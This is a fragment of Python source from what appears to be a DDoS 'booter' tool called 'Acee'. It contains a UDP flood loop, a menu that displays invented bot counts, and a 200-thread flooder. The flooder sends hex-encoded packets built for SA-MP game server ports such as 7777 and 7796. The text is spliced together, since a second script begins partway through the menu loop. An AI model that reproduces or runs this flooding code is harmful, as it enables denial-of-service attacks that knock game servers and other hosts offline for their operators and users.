	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(666,2109))
		sys.stdout.write("\x1b]20ACEE. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[36m[\033[36m{}\033[37m@Acee\033[36m]\033[32m$ \033[36m".format(nicknm)).lower()
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')